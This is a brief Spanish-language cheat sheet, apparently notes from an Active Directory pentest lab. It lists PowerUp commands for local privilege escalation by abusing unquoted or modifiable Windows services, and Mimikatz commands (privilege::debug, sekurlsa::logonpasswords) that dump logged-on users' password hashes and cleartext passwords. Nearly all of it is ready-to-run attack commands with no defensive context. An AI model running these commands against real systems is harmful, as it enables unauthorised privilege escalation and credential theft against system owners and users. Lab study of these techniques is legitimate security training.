## Escalada de privilegios Local
```PowerShell
Import-Module C:\AD\Tools\PowerUp.ps1
```

```PowerShell
Invoke-AllChecks
```

- ***Unquoted Service***: Servicios con la ruta sin comillas
- ***Modifiable Service***: Servicios modificables
```PowerShell
Invoke-ServiceAbuse -Name '<ServiceName' -username '<Domain\Username>'
```

## Búsqueda de información sensible Mimikatz
Deberemos de ejecutar una nueva CMD como Administrador
```
```PowerShell
C:\AD\Tools\mimikatz.exe
```

Comprobar si tenemos los permisos necesarisos
```shell
privilege::debug
```

Encontrar usuarios logeado con su hash o contraseñas en texto claro
```shell
sekurlsa::logonpasswords
```

